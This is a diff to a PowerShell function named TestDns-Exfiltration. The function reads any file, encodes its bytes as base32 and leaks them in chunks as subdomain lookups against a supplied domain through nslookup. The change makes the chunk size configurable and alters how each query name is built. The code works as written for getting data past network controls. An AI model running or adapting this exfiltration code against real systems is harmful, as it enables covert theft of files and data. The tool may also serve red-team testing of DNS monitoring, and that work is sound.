@@ -3,10 +3,11 @@ function TestDns-Exfiltration {
     param(
     [string] $filePath, 
     [string] $domain, 
-    [string] $dns = "8.8.8.8")
+    [string] $dns = "8.8.8.8",
+    [int16] $blocksize = 32)
 
     write-host "DNS File Exfiltration Test - @fgsec" -ForegroundColor "yellow"
-    $block_size = 5
+    $block_size = $blocksize
     if(Test-Path($filePath)) {
         [byte[]] $bytes = [IO.File]::ReadAllBytes($filePath)
         $byteArrayAsBinaryString = -join $bytes.ForEach{[Convert]::ToString($_, 2).PadLeft(8, '0')}
@@ -20,7 +21,7 @@ function TestDns-Exfiltration {
         $p = 0
         while($key_end -le ($Base32string.length)) {
             $payload = ($Base32string[$key_start..$key_end]) -join ""
-            $url =  "$p$payload.$domain"
+            $url =  "$payload.$domain".ToLower();
             write-host "[!] Request to: $url" -ForegroundColor gray
             nslookup -type=A $url
             $key_start = $key_end+1
